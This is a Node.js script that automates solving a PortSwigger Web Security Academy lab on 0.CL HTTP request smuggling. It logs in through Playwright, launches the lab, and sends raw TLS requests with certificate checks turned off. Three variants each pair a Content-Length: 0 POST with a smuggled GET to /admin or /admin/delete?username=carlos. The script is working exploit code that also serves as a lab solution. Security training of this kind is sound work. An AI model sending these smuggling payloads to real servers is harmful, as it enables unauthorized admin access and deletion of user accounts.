#!/usr/bin/env node
/**
 * RS #12 - 0.CL Request Smuggling
 * Direct raw TLS socket implementation
 */
const tls = require('node:tls');
const { chromium } = require('playwright');

const EMAIL = process.env.PORTSWIGGER_EMAIL;
const PASSWORD = process.env.PORTSWIGGER_PASSWORD;
const LAB_PAGE = 'https://portswigger.net/web-security/request-smuggling/advanced/lab-request-smuggling-0cl-request-smuggling';

async function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

function rawHttpRequest(host, payload, timeoutMs = 30000) {
  return new Promise((resolve, reject) => {
    const socket = tls.connect({
      host,
      port: 443,
      servername: host,
      ALPNProtocols: ['http/1.1'],
      rejectUnauthorized: false,
    });
    
    let data = '';
    const timeout = setTimeout(() => {
      socket.destroy();
      resolve(data);
    }, timeoutMs);
    
    socket.on('connect', () => {
      socket.write(payload);
    });
    
    socket.on('data', chunk => {
      data += chunk.toString();
    });
    
    socket.on('end', () => {
      clearTimeout(timeout);
      resolve(data);
    });
    
    socket.on('error', err => {
      clearTimeout(timeout);
      reject(err);
    });
  });
}

async function main() {
  const browser = await chromium.launch({ headless: true, args: ['--no-sandbox'] });
  const ctx = await browser.newContext();
  const page = await ctx.newPage();
  
  try {
    console.log('[*] Login...');
    await page.goto('https://portswigger.net/users', { waitUntil: 'networkidle', timeout: 30000 });
    await page.fill('#EmailAddress', EMAIL);
    await page.fill('#Password', PASSWORD);
    await Promise.all([page.waitForNavigation({ timeout: 15000 }).catch(() => {}), page.click('#Login')]);
    await sleep(2000);
    
    console.log('[*] Launch lab...');
    await page.goto(LAB_PAGE, { waitUntil: 'domcontentloaded', timeout: 30000 });
    await sleep(3000);
    await (await page.locator('a:has-text("ACCESS THE LAB")').first()).click();
    await sleep(40000);
    
    let labUrl = null;
    for (const p of ctx.pages()) {
      const u = p.url();
      if (u.includes('web-security-academy.net')) { labUrl = u.replace(/\/$/, ''); break; }
    }
    if (!labUrl) throw new Error('No lab URL');
    console.log('[+] Lab:', labUrl);
    
    const host = new URL(labUrl).hostname;
    
    // 0.CL: Server expects POST with Content-Length=0 but body actually contains smuggled request
    // Send POST with explicit Content-Length: 0, but also send body that will be parsed as next request
    
    console.log('[*] Trying 0.CL smuggling attack variants...');
    
    const attacks = [
      // Variant 1: POST with CL:0, body is a complete smuggled request
      `POST / HTTP/1.1\r\nHost: ${host}\r\nContent-Length: 0\r\n\r\nGET /admin HTTP/1.1\r\nHost: ${host}\r\nContent-Length: 100\r\n\r\nx`,
      
      // Variant 2: With Connection: keep-alive
      `POST / HTTP/1.1\r\nHost: ${host}\r\nContent-Length: 0\r\nConnection: keep-alive\r\n\r\nGET /admin/delete?username=carlos HTTP/1.1\r\nHost: ${host}\r\n\r\n`,
      
      // Variant 3: Double POST trick
      `POST /resources HTTP/1.1\r\nHost: ${host}\r\nContent-Length: 0\r\n\r\nGET /admin/delete?username=carlos HTTP/1.1\r\nHost: ${host}\r\nFoo: bar`,
    ];
    
    for (const attack of attacks) {
      try {
        console.log(`  Attempting attack (${attack.length} bytes)...`);
        const response = await rawHttpRequest(host, attack, 15000);
        console.log(`  Response (first 300 chars): ${response.substring(0, 300)}`);
        await sleep(5000);
      } catch (e) {
        console.log(`  Attack failed: ${e.message}`);
      }
    }
    
    // Check if solved
    console.log('[*] Verifying...');
    await page.goto(LAB_PAGE, { waitUntil: 'domcontentloaded', timeout: 30000 });
    await sleep(3000);
    const html = await page.content();
    const solved = html.includes('is-solved') || html.includes('Congratulations');
    console.log(solved ? 'SOLVED' : 'NOT SOLVED');
    process.exit(solved ? 0 : 1);
  } catch (e) {
    console.error(e.message);
    console.log('NOT SOLVED');
    process.exit(1);
  } finally {
    await browser.close().catch(() => {});
  }
}

main();
